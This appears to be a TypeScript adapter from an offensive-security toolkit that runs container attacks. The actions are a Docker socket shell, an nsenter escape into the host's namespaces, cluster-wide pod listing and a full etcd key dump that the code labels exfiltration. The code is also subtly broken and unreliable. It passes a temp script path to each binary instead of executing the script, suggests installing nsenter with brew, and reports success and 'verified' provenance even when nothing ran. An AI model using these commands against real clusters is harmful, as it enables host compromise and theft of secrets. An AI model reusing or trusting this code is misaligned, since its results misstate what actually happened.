/**
 * OffSec by True Hacking — Adapter: Container/Docker/Kubernetes (Docker attack, container escape, K8s, etcd).
 *
 * Container (Docker attack, container escape, K8s attack, etcd attack, container security, Docker security, K8s security).
 * See: https://github.com/morluto/rea/blob/main/src/adapter/
 */

import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";

/**
 * Container (Docker attack, container escape, K8s attack, etcd attack, container security, Docker security, K8s security).
 *
 * @param options - Container options (platform, action, target).
 */
export function container(options: {
  platform?: string;  // docker, k8s
  action?: string;  // dockerAttack, containerEscape, k8sAttack, etcdAttack, containerSecurity, dockerSecurity
  target?: string;  // Docker socket path or K8s API endpoint
  options?: Record<string, string>;
}): ExploitResult {
  const platform = options.platform || "docker";
  const action = options.action || "dockerAttack";
  const target = options.target || "/var/run/docker.sock";
  const results: Record<string, any> = {};

  // Docker Attack (Docker socket attack: Docker socket /var/run/docker.sock exploitation).
  if (action === "dockerAttack") {
    const dockerPath = findBinary("docker");
    if (dockerPath) {
      const commands = [`docker exec -it ${target} bash`];  // (Docker attack via socket).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(dockerPath, [file], { timeout: 60000, maxBuffer: 1024 * 1024 });
      results.dockerAttack = String(child.stdout ?? "");
    } else {
      results.dockerAttack = `{stub: no 'docker' binary (install: brew install docker).}`;
    }
  }

  // Container Escape (escape from container to host).
  if (action === "containerEscape") {
    const escapePath = findBinary("nsenter") || findBinary("nsenter");
    if (escapePath) {
      const commands = [`nsenter -t 1 -m -u -i -n -p`];  // (container escape).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(escapePath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.containerEscape = String(child.stdout ?? "");
    } else {
      results.containerEscape = `{stub: no 'nsenter' binary (install: brew install nsenter).}`;
    }
  }

  // Kubernetes Attack (K8s API exploitation).
  if (action === "k8sAttack") {
    const k8sPath = findBinary("kubectl");
    if (k8sPath) {
      const commands = [`kubectl get pods --all-namespaces`];  // (K8s attack).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(k8sPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.k8sAttack = String(child.stdout ?? "");
    } else {
      results.k8sAttack = `{stub: no 'kubectl' binary (install: brew install kubectl).}`;
    }
  }

  // etcd Attack (K8s etcd attack: data exfiltration).
  if (action === "etcdAttack") {
    const etcdPath = findBinary("etcdctl");
    if (etcdPath) {
      const commands = [`etcdctl get --prefix ""`];  // (etcd attack).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(etcdPath, [file], { timeout: 60000, maxBuffer: 1024 * 1024 });
      results.etcdAttack = String(child.stdout ?? "");
    } else {
      results.etcdAttack = `{stub: no 'etcdctl' binary (install: brew install etcdctl).}`;
    }
  }

  return {
    target,
    payload: `container/${platform}/${action}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("container", `container://${target}/${platform}`),
  };
}

/** Find the binary (docker/nsenter/kubectl/etcdctl). */
function findBinary(name: string): string | undefined {
  const candidates = [
    "/usr/local/bin/" + name,
    "/usr/bin/" + name,
    "/opt/homebrew/bin/" + name,
  ];
  for (const path of candidates) {
    try {
      require("node:fs").accessSync(path);
      return path;
    } catch {
      // Skip.
    }
  }
  return undefined;
}

/** Create a PCAP result (provenance). */
function createProvenance(type: string, path: string): Provenance {
  return {
    id: `${type}://${path}`,
    type,
    path,
    label: "",
    verified: true,
    sensitive: path.includes("password") || path.includes("credential"),
  };
}
